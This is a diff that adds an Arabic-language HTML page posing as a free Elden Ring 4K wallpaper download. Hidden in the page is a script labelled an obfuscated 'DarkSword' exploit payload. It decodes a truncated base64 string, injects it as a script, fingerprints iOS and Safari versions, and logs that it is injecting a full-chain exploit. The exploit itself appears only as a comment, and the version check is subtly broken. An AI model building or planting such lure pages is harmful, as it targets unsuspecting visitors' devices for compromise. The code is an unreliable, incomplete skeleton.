@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>صور مذهلة من Elden Ring - تحميل مجاني</title>
+    <style>
+        body { background: #000; color: #fff; font-family: Arial; text-align: center; }
+        img { max-width: 90%; margin: 20px; border-radius: 15px; }
+    </style>
+</head>
+<body>
+    <h1>استمتع بأجمل صور Elden Ring 4K</h1>
+    <img src="elden_ring_wallpaper.jpg" alt="Elden Ring">
+
+    <!-- الـ Exploit Payload المخفي - كل شيء obfuscated -->
+    <script>
+        // === DARK SWORD PAYLOAD - OBFUSCATED ===
+        (function(){
+            var a = "aHR0cHM6Ly9..."; // base64 encoded payload
+            var b = atob(a);
+            var c = document.createElement("script");
+            c.type = "text/javascript";
+            c.text = b;
+            document.head.appendChild(c);
+            
+            // Fingerprinting
+            function fingerprint() {
+                return {
+                    iosVersion: navigator.userAgent.match(/OS (\d+)_(\d+)_?(\d+)?/) || [],
+                    safariVersion: navigator.userAgent.match(/Version\/(\d+\.\d+)/)
+                };
+            }
+            
+            var fp = fingerprint();
+            if (fp.iosVersion && parseInt(fp.iosVersion[1]) >= 18 && parseInt(fp.iosVersion[1]) <= 18.7) {
+                // إرسال الـ full chain exploit
+                console.log("%c[DarkSword] Target vulnerable - Injecting...", "color: red; font-size: 16px");
+                // هنا يتم حقن الـ 6 ثغرات بالترتيب
+            }
+        })();
+    </script>
+</body>
+</html>
